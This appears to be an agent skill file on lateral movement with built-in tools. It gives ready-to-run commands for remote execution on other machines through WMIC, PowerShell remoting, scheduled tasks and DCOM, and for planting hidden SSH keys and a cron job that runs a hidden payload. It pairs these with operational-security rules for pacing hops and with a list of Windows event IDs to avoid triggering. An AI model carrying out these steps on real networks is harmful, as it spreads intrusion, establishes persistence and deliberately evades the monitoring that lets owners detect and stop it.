---
name: lateral-movement
description: Lateral movement techniques using built-in tools (LOLBAS). Covers SMB, WMI, SSH, RDP, and scheduled task methods.
---

# Lateral Movement

## OPSEC Rules
- Wait **300+ seconds** between hop attempts
- Use existing credentials/tokens when possible
- Prefer built-in tools over custom binaries
- Each hop = new detection surface; justify each one

## Windows Techniques

### SMB/PSExec-style (LOLBAS)
```bash
# Using WMIC (no psexec needed)
wmic /node:"TARGET" process call create "cmd /c whoami > C:\proof.txt"

# Using PowerShell remoting
Invoke-Command -ComputerName TARGET -ScriptBlock { whoami }

# Using scheduled tasks
schtasks /create /s TARGET /tn "Update" /tr "cmd /c payload" /sc once /st 00:00
schtasks /run /s TARGET /tn "Update"
```

### WMI Event Subscription (Persistent)
```powershell
# One-liner for WMI event-based execution
Set-WmiInstance -Class __EventFilter -Namespace "root\subscription" ...
```

### DCOM/Excel Macro (if available)
```powershell
$excel = [System.Activator]::CreateInstance([Type]::GetTypeFromProgID("Excel.Application","TARGET"))
```

## Linux Techniques

### SSH Key Deployment
```bash
# Generate keypair if needed
ssh-keygen -t rsa -b 4096 -f /tmp/.move_key -N ""

# Copy to target (requires password or existing key)
ssh-copy-id -i /tmp/.move_key.pub user@target

# Test
ssh -i /tmp/.move_key user@target "whoami"
```

### Cron Job Persistence
```bash
# Push cron via SSH
ssh user@target 'echo "* * * * * /tmp/.payload" | crontab -'
```

## Detection Indicators to Minimize
- Logon type 10 (RDP) events
- 4624 logon events from unusual sources
- 4698 scheduled task creation
- Network connections to new hosts
